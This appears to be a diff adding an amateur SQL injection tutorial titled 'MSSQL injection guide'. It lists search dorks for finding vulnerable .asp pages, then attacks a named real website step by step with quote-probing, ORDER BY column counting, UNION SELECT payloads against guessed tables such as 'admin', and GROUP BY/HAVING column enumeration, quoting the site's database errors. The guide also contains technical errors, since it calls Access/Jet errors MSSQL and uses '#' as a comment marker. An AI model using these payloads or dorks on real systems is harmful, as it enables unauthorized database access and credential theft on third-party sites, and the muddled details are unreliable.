@@ -1,0 +1,94 @@
+MSSQL injection guide 
+Written by: xterminal 
+ 
+I did'nt find any good MSSQL injection guide, so idecided to write what i know so far about MSSQLi, ... tests will be 
+the tests on real hosts ... so lets start! 
+ 
+Step 1: 
+------ 
+ 
+Good dork: site:.org inurl:.asp?id= 
+			  site:.com inrul:.aspx?= 
+			  site:.co.uk inurl:.asp?cid= 
+			  Or you can figure out your own dork. 
+Step 2: 
+------- 
+ 
+Lets say we found this http://www.expo-centre.ae we will crawl around it until we get to this 
+http://www.expo-centre.ae/en/pressread.asp?id=563 
+We should see normal page is on. i will to put single quote and see what we could come up with, the resultant URL is 
+http://www.expo-centre.ae/en/pressread.asp?id=563' 
+Now you should see and error like this, 
+ 
+Microsoft OLE DB Provider for ODBC Drivers error '80040e14' 
+[Microsoft][ODBC Microsoft Access Driver] Syntax error in string in query expression 'id=563' ;'. 
+/en/includes/configdb.asp, line 23 
+ 
+the error msg on the second like says that we have great chance to inject here, so we proceed with the 1+and+1 test, 
+http://www.expo-centre.ae/en/pressread.asp?id=563+AND+1=1# 
+ 
+NOTE: 
+---- 
+In asp we will use the # for commenting the rest of the query instead of -- or /* . 
+If you got an error says type mismatch like Cint or string something, we can figure out that the input is being checked 
+for data type. if you insising you should find a site that accepts both int and chat in the input. 
+ 
+Now we are going to use AND+1=0# 
+http://www.expo-centre.ae/en/pressread.asp?id=563+AND+1=0# 
+if you got incomplete page on or such and error on, 
+ 
+ADODB.Field error '800a0bcd' 
+Either BOF or EOF is True, or the current record has been deleted. Requested operation requires a current record. 
+/en/pressread.asp, line 44 
+ 
+Now we need to find the column number, for that we will use ORDER BY command Again :) 
+ 
+Microsoft OLE DB Provider for ODBC Drivers error '80004005' 
+[Microsoft][ODBC Microsoft Access Driver] The Microsoft Jet database engine does not recognize '10' as a valid field name or expressi 
+on. 
+/en/includes/configdb.asp, line 23 
+ 
+that error like our MySQL error Unknow Column '10'. we will keep on decreasing untill we are on the correct number. 
+for out example that should be ... 7 :) 
+http://www.expo-centre.ae/en/pressread.asp?id=563+AND+1=0+UNION+ALL+SELECT+1,2,3,4,5,6,7# 
+at this point you should see another error, 
+ 
+Microsoft OLE DB Provider for ODBC Drivers error '80004005' 
+[Microsoft][ODBC Microsoft Access Driver] Query input must contain at least one table or query. 
+/en/includes/configdb.asp, line 23 
+ 
+the query will not execute. because the query needs an existing table to successfully execute, we will keep guessing 
+until we get existing table, otherwise we will get this error: 
+ 
+Microsoft OLE DB Provider for ODBC Drivers error '80040e37' 
+[Microsoft][ODBC Microsoft Access Driver] The Microsoft Jet database engine cannot find the input table or query 'dmin'. Make sure it 
+ exists and that its name is spelled correctly. 
+/en/includes/configdb.asp, line 23 
+ 
+that error means the table used does not exist, possible tables that works most of the time are; 
+ 
+user 
+users 
+admin 
+login 
+news 
+sysobjects 
+customers 
+.... 
+ 
+Our example will be happy with table admin and .... 
+http://www.expo-centre.ae/en/pressread.asp?id=563+AND+1=0+UNION+ALL+SELECT+1,2,3,4,5,6,7+from+admin# 
+you should still seeing error ignore it and look up besides the 'PRESS RELEASES >' you should see number 4 
+at this point i think you guys can find out about columns names ...etc. 
+ 
+Step 3: 
+------ 
+You can find the columns names by using HAVEING BY, for example 
+HAVING 1=1 -- 
+GROUP BY table.columnfromerror1 HAVING 1=1 -- 
+GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 -- 
+GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 -- and on and on ... 
+ 
+THAT WILL BE ALL... 
+I HOPE THE PAPER WAS HELPING! :) 
+
